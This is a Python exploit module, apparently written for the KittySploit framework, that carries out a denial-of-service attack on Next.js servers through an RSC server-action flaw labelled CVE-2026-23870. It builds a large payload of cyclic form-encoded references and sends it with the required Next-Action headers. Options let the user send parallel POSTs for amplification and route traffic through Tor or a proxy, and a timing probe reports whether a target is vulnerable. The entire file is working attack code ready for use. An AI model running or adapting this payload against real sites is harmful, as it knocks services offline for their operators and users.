#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Next.js RSC server-action DoS (CVE-2026-23870)",
        "description": (
            "Form-encoded cyclic RSC reply with Next-Action + Accept: text/x-component. "
            "Pre-patch React (Next.js < 16.2.5) can spin CPU / blow the stack. Availability only."
        ),
        "author": ["KittySploit Team"],
        "cve": "CVE-2026-23870",
        "references": ["https://github.com/advisories/GHSA-8h8q-6873-q5fj"],
        "tags": ["http", "dos", "nextjs", "react", "rsc", "server-action"],
    }

    rows = OptInteger(15000, "Cyclic RSC form rows in POST body", required=False)
    concurrency = OptInteger(1, "Parallel POSTs after the first (amplification)", required=False)
    next_action = OptString(
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "Next-Action header (40-char action id on real targets)",
        required=False,
    )
    post_timeout = OptInteger(120, "POST timeout (s); server may hang", required=False, advanced=True)
    check_rows = OptInteger(4000, "Rows for check() only", required=False, advanced=True)
    vulnerable_wall_seconds = OptFloat(2.0, "Wall time above = likely vulnerable", required=False, advanced=True)

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _url(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        path = str(self.path).strip() or "/"
        if not path.startswith("/"):
            path = "/" + path
        return f"{proto}://{t}:{p}{path}"

    def _verify_proxies(self):
        verify = self._to_bool(self._o(self.verify_ssl))
        px = str(self._o(self.proxy) or "").strip()
        proxies = {}
        if px:
            proxies = {"http": px, "https": px}
        elif self.framework and getattr(self.framework, "is_tor_enabled", lambda: False)():
            tor = self.framework.tor_manager.get_tor_proxy_dict()
            if tor:
                proxies = tor
        elif self.framework and getattr(self.framework, "is_proxy_enabled", lambda: False)():
            u = self.framework.get_proxy_url()
            if u:
                proxies = {"http": u, "https": u, "all": u}
        return verify, proxies or None

    @staticmethod
    def _body(rows: int) -> bytes:
        parts = []
        for i in range(rows):
            n = (i + 1) % rows
            v = f'["$F","{i:x}",{{"r":"${n:x}"}}]'
            parts.append(f"{i}={quote(v, safe='')}")
        return "&".join(parts).encode()

    def _post(self, body: bytes, timeout: float):
        self._configure_session()
        verify, proxies = self._verify_proxies()
        h = {str(k): str(v) for k, v in self.session.headers.items()}
        h.update(
            {
                "Content-Type": "application/x-www-form-urlencoded",
                "Next-Action": str(self._o(self.next_action)),
                "Accept": "text/x-component",
            }
        )
        t0 = time.perf_counter()
        try:
            r = requests.post(self._url(), data=body, headers=h, timeout=timeout, verify=verify, proxies=proxies)
            return r.status_code, time.perf_counter() - t0, None
        except requests.RequestException as e:
            return -1, time.perf_counter() - t0, str(e)

    def _get_baseline(self):
        verify, proxies = self._verify_proxies()
        t0 = time.perf_counter()
        try:
            self._configure_session()
            r = self.session.get(self._url(), timeout=float(self._o(self.timeout)), verify=verify, proxies=proxies)
            return r.status_code, time.perf_counter() - t0, None
        except requests.RequestException as e:
            return -1, time.perf_counter() - t0, str(e)

    def _vuln(self, code, wall, err):
        if err and "Connection" in err:
            return False
        thr = float(self._o(self.vulnerable_wall_seconds))
        return wall > thr or code in (500, 502, 503, 504)

    def check(self):
        rows = max(100, int(self._o(self.check_rows)))
        to = min(90.0, float(self._o(self.post_timeout)))
        bc, bw, be = self._get_baseline()
        if be and "Connection" in be:
            return {"vulnerable": False, "reason": f"GET unreachable: {be}", "confidence": "high"}
        body = self._body(rows)
        c, w, e = self._post(body, to)
        if e and "Connection" in e:
            return {"vulnerable": False, "reason": f"POST unreachable: {e}", "confidence": "high"}
        ok = self._vuln(c, w, e)
        probe = {"http_code": c, "wall_seconds": w, "error": e, "body_bytes": len(body)}
        if ok:
            return {
                "vulnerable": True,
                "reason": f"Probe {rows} rows: HTTP {c}, {w:.2f}s",
                "confidence": "medium",
                "baseline_get": {"code": bc, "wall": bw},
                "probe": probe,
            }
        return {
            "vulnerable": False,
            "reason": f"Weak signal HTTP {c}, {w:.2f}s",
            "confidence": "low",
            "baseline_get": {"code": bc, "wall": bw},
            "probe": probe,
        }

    def run(self) -> bool:
        rows = max(2, int(self._o(self.rows)))
        conc = max(1, int(self._o(self.concurrency)))
        pto = float(self._o(self.post_timeout))
        body = self._body(rows)

        print_info(f"Target: {self._url()}")
        print_status("Baseline GET …")
        bc, bw, be = self._get_baseline()
        print_status(f"  HTTP {bc}  {bw:.2f}s  err={be}")
        print_status(f"POST body {len(body):,} bytes …")
        c, w, e = self._post(body, pto)
        print_status(f"  HTTP {c}  {w:.2f}s  err={e}")
        if e and "Connection" in e:
            print_error("Unreachable.")
            return False
        hit = self._vuln(c, w, e)
        if hit:
            print_success(f"DoS signal: {w:.2f}s HTTP {c}")
        else:
            print_warning(f"No strong signal: {w:.2f}s HTTP {c}")
        if conc > 1:
            print_status(f"{conc} parallel POSTs …")
            t0 = time.perf_counter()
            with ThreadPoolExecutor(max_workers=conc) as pool:
                futs = [pool.submit(self._post, body, pto) for _ in range(conc)]
                done = [f.result() for f in as_completed(futs)]
            walls = [x[1] for x in done]
            print_status(f"  wall total {time.perf_counter() - t0:.2f}s  avg {sum(walls) / len(walls):.2f}s  codes {[x[0] for x in done]}")
        return bool(hit)
